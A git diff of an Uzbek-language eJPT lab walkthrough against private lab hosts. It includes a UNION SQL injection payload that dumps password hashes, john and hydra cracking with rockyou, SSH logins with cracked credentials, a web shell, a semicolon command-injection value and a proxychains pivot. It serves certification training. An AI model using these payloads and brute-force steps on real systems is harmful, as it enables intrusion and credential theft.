@@ -23,27 +23,28 @@ chiqarasiz, uni buzasiz (crack), so'ng shu parol bilan SSH qilasiz.
 
 **Enum:** homepage'da ko'rsatkich yo'q — kataloglarni topish kerak:
 ```bash
-dirb http://10.10.20.10 /root/dirs.txt      # -> /search.php (yashirin), /dashboard.php, /uploads/
+dirb http://10.10.20.10 /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -X .php,.old,.bak
+#  -> /search.php (yashirin), /dashboard.php, /uploads/   (katta ro'yxat — bir necha daqiqa)
 ```
 
 **a) SQLi (UNION) — parol HASH'larini dump qilish:** `search.php?q=` 2 ustunli (name, price):
 ```bash
 curl "http://10.10.20.10/search.php?q=%25'%20UNION%20SELECT%20username,password%20FROM%20users--%20-"
 # -> admin    : $1$acme01$LKXfufFStU2JIHhZ8jBW2/
-#    sysadmin : $1$acme02$uiKoWRDnmr5mUs9ngQm3C.   (md5crypt — ochiq matn EMAS!)
+#    sysadmin : $1$acme02$eJjYQgCVKMy0cZ59zFG9E.   (md5crypt — ochiq matn EMAS!)
 #    editor   : $1$acme03$xE1wR2RXoF42CJ0i6pHPh/
 ```
 
-**b) Hash'ni buzish (john + wordlist):**
+**b) Hash'ni buzish (john + rockyou):** sysadmin paroli rockyou'da (chuqurroqda) — bir necha daqiqa ketadi:
 ```bash
-echo 'sysadmin:$1$acme02$uiKoWRDnmr5mUs9ngQm3C.' > h.txt
-john --wordlist=/root/wordlist.txt h.txt
-john --show h.txt          # -> sysadmin:Ac3m3S3rv3r!
+echo 'sysadmin:$1$acme02$eJjYQgCVKMy0cZ59zFG9E.' > h.txt
+john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt h.txt
+john --show h.txt          # -> sysadmin:jimmyis22   (admin/editor rockyou bilan buzilmaydi)
 ```
 
 **c) SSH — buzilgan parol bilan foothold:**
 ```bash
-sshpass -p 'Ac3m3S3rv3r!' ssh sysadmin@10.10.20.10
+sshpass -p 'jimmyis22' ssh sysadmin@10.10.20.10
 cat /var/www/html/user.txt
 ```
 ➡️ **USER flag:** `EJPT{w3b_upl04d_rce_www_data}`
@@ -64,7 +65,7 @@ cat /root/root.txt
 ## 1a) web-easy 🟢 (10.10.20.40) — ochiq config → SSH → sudo bash → root
 
 ```bash
-dirb http://10.10.20.40 /root/dirs.txt         # -> /config.old
+dirb http://10.10.20.40 /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -X .old,.bak,.txt   # -> /config.old
 curl http://10.10.20.40/config.old             # -> ssh_user=deploy  ssh_pass=D3ploy2024!
 sshpass -p 'D3ploy2024!' ssh deploy@10.10.20.40
 cat /home/deploy/user.txt                       # EJPT{3xp0s3d_c0nf1g_ssh}
@@ -94,13 +95,14 @@ cat /root/root.txt                              # EJPT{c4p_s3tu1d_p3rl_r00t}
 **a) Anonim FTP:**
 ```bash
 ftp 10.10.20.20        # user: anonymous, parol: (bo'sh)
-# get note_to_bob.txt  -> "parolingni o'zgartir — 'football' juda oddiy!"
+# get note_to_bob.txt  -> "paroling oddiy lug'atdagi so'z — rockyou bilan topiladi!"
 ```
-Yoki brute-force: `hydra -l bob -P /root/wordlist.txt ssh://10.10.20.20` → `bob:football`.
+Brute-force (rockyou — `coconut` ro'yxat boshiga yaqin, bir necha daqiqa):
+`hydra -l bob -P /usr/share/wordlists/rockyou.txt ssh://10.10.20.20` → `bob:coconut`.
 
 **b) Foothold:**
 ```bash
-sshpass -p football ssh bob@10.10.20.20
+sshpass -p coconut ssh bob@10.10.20.20
 cat /home/bob/user.txt
 ```
 ➡️ **USER flag:** `EJPT{ftp_ssh_cr4ck_f00th0ld}`
@@ -159,7 +161,7 @@ curl "http://10.10.20.10/uploads/sh.php?c=curl -s 'http://10.10.10.20:8080/ping?
 **"Toza" pivot (proxychains + ssh dynamic port forward):**
 ```bash
 # web-01'da sysadmin bilan SOCKS proxy ochamiz:
-sshpass -p 'Ac3m3S3rv3r!' ssh -f -N -D 1080 sysadmin@10.10.20.10
+sshpass -p 'jimmyis22' ssh -f -N -D 1080 sysadmin@10.10.20.10
 # /etc/proxychains.conf: socks5 127.0.0.1 1080
 proxychains curl "http://10.10.10.20:8080/ping?host=127.0.0.1;cat /flag.txt"
 ```
